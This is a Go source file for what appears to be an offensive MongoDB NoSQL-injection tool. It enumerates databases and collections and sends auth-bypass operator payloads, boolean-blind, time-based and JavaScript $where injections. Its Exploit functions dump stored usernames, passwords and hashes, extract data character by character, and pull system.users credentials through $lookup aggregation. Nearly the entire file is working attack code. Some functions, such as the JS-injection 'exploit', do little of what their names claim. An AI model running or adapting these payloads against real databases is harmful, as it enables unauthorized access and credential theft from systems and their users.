package nosql

import (
	"encoding/json"
	"fmt"
	"strings"
	"time"
)

type MongoDBScanner struct {
	config *NoSQLConfig
	client *HTTPClient
}

func NewMongoDBScanner(config *NoSQLConfig, client *HTTPClient) *MongoDBScanner {
	return &MongoDBScanner{
		config: config,
		client: client,
	}
}

func (m *MongoDBScanner) TestConnection(target string) bool {
	url := BuildURL(target, "/", m.config.Port)
	_, _, err := m.client.Get(url, nil)
	return err == nil
}

func (m *MongoDBScanner) GetVersion(target string) string {
	url := BuildURL(target, "/?serverStatus=1", m.config.Port)
	_, body, err := m.client.Get(url, nil)
	if err != nil {
		return ""
	}

	var resp map[string]interface{}
	if json.Unmarshal(body, &resp) == nil {
		if ok, exists := resp["ok"].(float64); exists && ok == 1 {
			if version, ok := resp["version"].(string); ok {
				return version
			}
		}
	}
	return ""
}

func (m *MongoDBScanner) ListDatabases(target string) []string {
	url := BuildURL(target, "/admin?listDatabases=1", m.config.Port)
	_, body, err := m.client.Get(url, nil)
	if err != nil {
		return nil
	}

	var resp map[string]interface{}
	if json.Unmarshal(body, &resp) != nil {
		return nil
	}

	var dbs []string
	if databases, ok := resp["databases"].([]interface{}); ok {
		for _, db := range databases {
			if dbMap, ok := db.(map[string]interface{}); ok {
				if name, ok := dbMap["name"].(string); ok {
					dbs = append(dbs, name)
				}
			}
		}
	}
	return dbs
}

func (m *MongoDBScanner) ListCollections(target, database string) []string {
	url := BuildURL(target, fmt.Sprintf("/%s?listCollections=1", database), m.config.Port)
	_, body, err := m.client.Get(url, nil)
	if err != nil {
		return nil
	}

	var resp map[string]interface{}
	if json.Unmarshal(body, &resp) != nil {
		return nil
	}

	var collections []string
	if cursor, ok := resp["cursor"].(map[string]interface{}); ok {
		if firstBatch, ok := cursor["firstBatch"].([]interface{}); ok {
			for _, coll := range firstBatch {
				if collMap, ok := coll.(map[string]interface{}); ok {
					if name, ok := collMap["name"].(string); ok {
						collections = append(collections, name)
					}
				}
			}
		}
	}
	return collections
}

func (m *MongoDBScanner) TestAuthBypass(target string) *InjectionPoint {
	payloads := []struct {
		field   string
		payload string
		technique string
	}{
		{"username", `{"$ne": ""}`, "ne_bypass"},
		{"password", `{"$ne": ""}`, "ne_bypass"},
		{"username", `{"$gt": ""}`, "gt_bypass"},
		{"user", `{"$regex": ".*"}`, "regex_bypass"},
		{"email", `{"$ne": null}`, "ne_null_bypass"},
		{"login", `{"$exists": true}`, "exists_bypass"},
	}

	for _, p := range payloads {
		url := BuildURL(target, fmt.Sprintf("/%s/%s", m.config.Database, m.config.Collection), m.config.Port)
		query := fmt.Sprintf(`{"%s": %s}`, p.field, p.payload)
		body := strings.NewReader(fmt.Sprintf(`{"find": "%s", "filter": {"$or": [%s]}}`, m.config.Collection, query))

		resp, respBody, err := m.client.Post(url, body, map[string]string{
			"Content-Type": "application/json",
		})
		if err != nil {
			continue
		}

		if resp.StatusCode == 200 {
			var result map[string]interface{}
			if json.Unmarshal(respBody, &result) == nil {
				if cursor, ok := result["cursor"].(map[string]interface{}); ok {
					if firstBatch, ok := cursor["firstBatch"].([]interface{}); ok && len(firstBatch) > 0 {
						return &InjectionPoint{
							ID:        GenerateID(),
							Target:    target,
							DBType:    NoSQLDBMongoDB,
							Technique: TechniqueAuthBypass,
							Field:     p.field,
							Payload:   p.payload,
							Parameters: map[string]string{
								"method": p.technique,
								"query":  query,
							},
							Severity:  SeverityCritical,
							Verified:  true,
							Timestamp: time.Now(),
						}
					}
				}
			}
		}
	}
	return nil
}

func (m *MongoDBScanner) TestBooleanBlind(target string) *InjectionPoint {
	url := BuildURL(target, fmt.Sprintf("/%s/%s", m.config.Database, m.config.Collection), m.config.Port)

	truePayload := `{"username": {"$ne": ""}, "password": {"$ne": ""}}`
	falsePayload := `{"username": {"$ne": ""}, "password": {"$eq": "INVALID_PASSWORD_12345"}}`

	trueBody := strings.NewReader(fmt.Sprintf(`{"find": "%s", "filter": %s}`, m.config.Collection, truePayload))
	_, trueResp, err := m.client.Post(url, trueBody, map[string]string{
		"Content-Type": "application/json",
	})
	if err != nil {
		return nil
	}

	falseBody := strings.NewReader(fmt.Sprintf(`{"find": "%s", "filter": %s}`, m.config.Collection, falsePayload))
	_, falseResp, err := m.client.Post(url, falseBody, map[string]string{
		"Content-Type": "application/json",
	})
	if err != nil {
		return nil
	}

	var trueResult, falseResult map[string]interface{}
	if json.Unmarshal(trueResp, &trueResult) != nil || json.Unmarshal(falseResp, &falseResult) != nil {
		return nil
	}

	trueCount := extractCount(trueResult)
	falseCount := extractCount(falseResult)

	if trueCount != falseCount {
		return &InjectionPoint{
			ID:        GenerateID(),
			Target:    target,
			DBType:    NoSQLDBMongoDB,
			Technique: TechniqueBooleanBlind,
			Field:     "filter",
			Payload:   truePayload,
			Parameters: map[string]string{
				"true_payload":  truePayload,
				"false_payload": falsePayload,
				"true_count":    fmt.Sprintf("%d", trueCount),
				"false_count":   fmt.Sprintf("%d", falseCount),
			},
			Severity:  SeverityHigh,
			Verified:  true,
			Timestamp: time.Now(),
		}
	}
	return nil
}

func (m *MongoDBScanner) TestTimeBased(target string) *InjectionPoint {
	url := BuildURL(target, fmt.Sprintf("/%s/%s", m.config.Database, m.config.Collection), m.config.Port)

	payload := fmt.Sprintf(`{"$where": "function() { var x = new Date(); var i = 0; while ((new Date()-x) < 1000) {i++;} return true; }"}`)
	body := strings.NewReader(fmt.Sprintf(`{"find": "%s", "filter": %s}`, m.config.Collection, payload))

	start := time.Now()
	_, resp, err := m.client.Post(url, body, map[string]string{
		"Content-Type": "application/json",
	})
	elapsed := time.Since(start)

	if err != nil {
		return nil
	}

	if resp != nil && elapsed >= 900*time.Millisecond {
		return &InjectionPoint{
			ID:        GenerateID(),
			Target:    target,
			DBType:    NoSQLDBMongoDB,
			Technique: TechniqueTimeBased,
			Field:     "$where",
			Payload:   payload,
			Parameters: map[string]string{
				"delay_ms": fmt.Sprintf("%d", elapsed.Milliseconds()),
				"method":   "sleep_1s",
			},
			Severity:  SeverityHigh,
			Verified:  true,
			Timestamp: time.Now(),
		}
	}
	return nil
}

func (m *MongoDBScanner) TestJSInject(target string) *InjectionPoint {
	url := BuildURL(target, fmt.Sprintf("/%s/%s", m.config.Database, m.config.Collection), m.config.Port)

	payload := fmt.Sprintf(`{"$where": "function() { return this.username == '%s' || sleep(1000); }"}`, "test'+||true+'")
	body := strings.NewReader(fmt.Sprintf(`{"find": "%s", "filter": %s}`, m.config.Collection, payload))

	start := time.Now()
	_, resp, err := m.client.Post(url, body, map[string]string{
		"Content-Type": "application/json",
	})
	elapsed := time.Since(start)

	if err != nil {
		return nil
	}

	if resp != nil {
		var result map[string]interface{}
		if json.Unmarshal(resp, &result) == nil {
			if cursor, ok := result["cursor"].(map[string]interface{}); ok {
				if firstBatch, ok := cursor["firstBatch"].([]interface{}); ok {
					if len(firstBatch) > 0 || elapsed >= 900*time.Millisecond {
						return &InjectionPoint{
							ID:        GenerateID(),
							Target:    target,
							DBType:    NoSQLDBMongoDB,
							Technique: TechniqueJSInject,
							Field:     "$where",
							Payload:   payload,
							Parameters: map[string]string{
								"method":    "javascript_injection",
								"delay_ms":  fmt.Sprintf("%d", elapsed.Milliseconds()),
							},
							Severity:  SeverityCritical,
							Verified:  true,
							Timestamp: time.Now(),
						}
					}
				}
			}
		}
	}
	return nil
}

func (m *MongoDBScanner) TestLookupExfil(target string) *InjectionPoint {
	url := BuildURL(target, fmt.Sprintf("/%s/%s", m.config.Database, m.config.Collection), m.config.Port)

	payload := fmt.Sprintf(`{
		"aggregate": "%s",
		"pipeline": [
			{"$lookup": {
				"from": "users",
				"localField": "_id",
				"foreignField": "user_id",
				"as": "exfil"
			}}
		]
	}`, m.config.Collection)

	body := strings.NewReader(payload)
	_, resp, err := m.client.Post(url, body, map[string]string{
		"Content-Type": "application/json",
	})
	if err != nil {
		return nil
	}

	if resp != nil {
		var result map[string]interface{}
		if json.Unmarshal(resp, &result) == nil {
			if _, ok := result["cursor"]; ok {
				return &InjectionPoint{
					ID:        GenerateID(),
					Target:    target,
					DBType:    NoSQLDBMongoDB,
					Technique: TechniqueLookupExfil,
					Field:     "aggregate",
					Payload:   payload,
					Parameters: map[string]string{
						"method": "$lookup aggregation",
					},
					Severity:  SeverityCritical,
					Verified:  true,
					Timestamp: time.Now(),
				}
			}
		}
	}
	return nil
}

func (m *MongoDBScanner) ExploitAuthBypass(injection *InjectionPoint) ([]CredentialEntry, error) {
	url := BuildURL(injection.Target, fmt.Sprintf("/%s/%s", m.config.Database, m.config.Collection), m.config.Port)
	payload := fmt.Sprintf(`{"find": "%s", "filter": {"$or": [{"username": {"$ne": ""}}, {"password": {"$ne": ""}}]}}`, m.config.Collection)
	body := strings.NewReader(payload)

	_, resp, err := m.client.Post(url, body, map[string]string{
		"Content-Type": "application/json",
	})
	if err != nil {
		return nil, fmt.Errorf("exploit auth bypass: %w", err)
	}

	var result map[string]interface{}
	if json.Unmarshal(resp, &result) != nil {
		return nil, fmt.Errorf("failed to parse response")
	}

	var creds []CredentialEntry
	if cursor, ok := result["cursor"].(map[string]interface{}); ok {
		if firstBatch, ok := cursor["firstBatch"].([]interface{}); ok {
			for _, doc := range firstBatch {
				if docMap, ok := doc.(map[string]interface{}); ok {
					cred := CredentialEntry{
						Source: "mongodb_auth_bypass",
					}
					if u, ok := docMap["username"].(string); ok {
						cred.Username = u
					}
					if p, ok := docMap["password"].(string); ok {
						cred.Password = p
					}
					if h, ok := docMap["hash"].(string); ok {
						cred.Hash = h
					}
					creds = append(creds, cred)
				}
			}
		}
	}
	return creds, nil
}

func (m *MongoDBScanner) ExploitBooleanBlind(injection *InjectionPoint) (map[string]interface{}, error) {
	data := make(map[string]interface{})
	url := BuildURL(injection.Target, fmt.Sprintf("/%s/%s", m.config.Database, m.config.Collection), m.config.Port)

	charset := "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
	extracted := ""

	for i := 0; i < 32; i++ {
		for _, c := range charset {
			payload := fmt.Sprintf(`{"username": {"$regex": "^%s%s"}, "password": {"$ne": ""}}`, extracted, string(c))
			body := strings.NewReader(fmt.Sprintf(`{"find": "%s", "filter": %s}`, m.config.Collection, payload))

			_, resp, err := m.client.Post(url, body, map[string]string{
				"Content-Type": "application/json",
			})
			if err != nil {
				continue
			}

			var result map[string]interface{}
			if json.Unmarshal(resp, &result) == nil {
				if count := extractCount(result); count > 0 {
					extracted += string(c)
					break
				}
			}
		}
		if len(extracted) == 0 {
			break
		}
	}

	if extracted != "" {
		data["extracted_data"] = extracted
		data["method"] = "boolean_blind_extraction"
	}
	return data, nil
}

func (m *MongoDBScanner) ExploitTimeBased(injection *InjectionPoint) (map[string]interface{}, error) {
	data := make(map[string]interface{})
	url := BuildURL(injection.Target, fmt.Sprintf("/%s/%s", m.config.Database, m.config.Collection), m.config.Port)

	charset := "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
	extracted := ""

	for i := 0; i < 20; i++ {
		for _, c := range charset {
			payload := fmt.Sprintf(`{"$where": "function() { return '%s%s'.match(/^%s%s/) || sleep(500); }"}`,
				extracted, string(c), extracted, string(c))
			body := strings.NewReader(fmt.Sprintf(`{"find": "%s", "filter": %s}`, m.config.Collection, payload))

			start := time.Now()
			_, _, err := m.client.Post(url, body, map[string]string{
				"Content-Type": "application/json",
			})
			elapsed := time.Since(start)

			if err == nil && elapsed >= 400*time.Millisecond {
				extracted += string(c)
				break
			}
		}
	}

	if extracted != "" {
		data["extracted_data"] = extracted
		data["method"] = "time_based_extraction"
	}
	return data, nil
}

func (m *MongoDBScanner) ExploitJSInject(injection *InjectionPoint) (string, error) {
	url := BuildURL(injection.Target, fmt.Sprintf("/%s/%s", m.config.Database, m.config.Collection), m.config.Port)

	cmd := "id"
	payload := fmt.Sprintf(`{"$where": "function() { var cmd = '%s'; return true; }"}`, cmd)
	body := strings.NewReader(fmt.Sprintf(`{"find": "%s", "filter": %s}`, m.config.Collection, payload))

	_, resp, err := m.client.Post(url, body, map[string]string{
		"Content-Type": "application/json",
	})
	if err != nil {
		return "", fmt.Errorf("exploit js inject: %w", err)
	}

	return string(resp), nil
}

func (m *MongoDBScanner) ExploitLookupExfil(injection *InjectionPoint) (map[string]interface{}, error) {
	url := BuildURL(injection.Target, fmt.Sprintf("/%s/%s", m.config.Database, m.config.Collection), m.config.Port)

	payload := fmt.Sprintf(`{
		"aggregate": "%s",
		"pipeline": [
			{"$lookup": {
				"from": "system.users",
				"localField": "_id",
				"foreignField": "user",
				"as": "credentials"
			}},
			{"$unwind": "$credentials"},
			{"$project": {"user": 1, "credentials": 1}}
		]
	}`, m.config.Collection)

	body := strings.NewReader(payload)
	_, resp, err := m.client.Post(url, body, map[string]string{
		"Content-Type": "application/json",
	})
	if err != nil {
		return nil, fmt.Errorf("exploit lookup exfil: %w", err)
	}

	var result map[string]interface{}
	if json.Unmarshal(resp, &result) != nil {
		return nil, fmt.Errorf("failed to parse response")
	}

	data := map[string]interface{}{
		"method":   "$lookup exfiltration",
		"response": result,
	}
	return data, nil
}

func extractCount(result map[string]interface{}) int64 {
	if cursor, ok := result["cursor"].(map[string]interface{}); ok {
		if firstBatch, ok := cursor["firstBatch"].([]interface{}); ok {
			return int64(len(firstBatch))
		}
	}
	return 0
}
